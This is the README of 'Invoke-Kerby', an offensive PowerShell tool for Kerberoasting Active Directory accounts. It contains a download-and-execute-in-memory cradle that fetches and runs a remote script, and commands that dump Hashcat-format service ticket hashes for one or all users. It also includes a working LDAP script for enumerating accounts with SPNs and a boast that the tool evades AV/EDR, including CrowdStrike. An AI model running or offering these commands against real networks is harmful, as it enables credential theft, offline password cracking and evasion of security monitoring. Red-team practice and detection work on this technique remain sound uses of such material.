# Invoke-Kerby
PowerShell Script for Kerberoasting

<img width="150" height="150" alt="image" src="https://github.com/user-attachments/assets/f603272b-fd31-4915-81b6-67e25b019654" />

## Usage

Download and execute into memory:

````
# load into memory
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/l4rm4nd/Invoke-Kerby/refs/heads/main/Invoke-Kerby.ps1')

# kerberoast single user
Invoke-Kerby -Identity max.muster -OutputFormat Hashcat | % { $_.Hash }

# kerberoast all
Invoke-Kerby -OutputFormat Hashcat | % { $_.Hash }
````

>[!TIP]
> Undetected on AV/EDR. No AMSI bypass required. Tested against CrowdStrike.

<details>
In case you need to enumerate SPNs first:
  
````
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$root = "LDAP://" + $domain.Name
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$root)

$searcher.Filter = "(&(objectCategory=person)(servicePrincipalName=*))"
$searcher.PageSize = 500
$searcher.PropertiesToLoad.Add("samaccountname")     | Out-Null
$searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
$searcher.PropertiesToLoad.Add("distinguishedName")  | Out-Null

$searcher.FindAll() | ForEach-Object {
    $user = $_.Properties["samaccountname"][0]
    $dn = $_.Properties["distinguishedname"][0]
    $spns = $_.Properties["servicePrincipalName"]

    foreach ($spn in $spns) {
        [pscustomobject]@{
            User = $user
            SPN  = $spn
            DN   = $dn
        }
    }
}
````

</details>
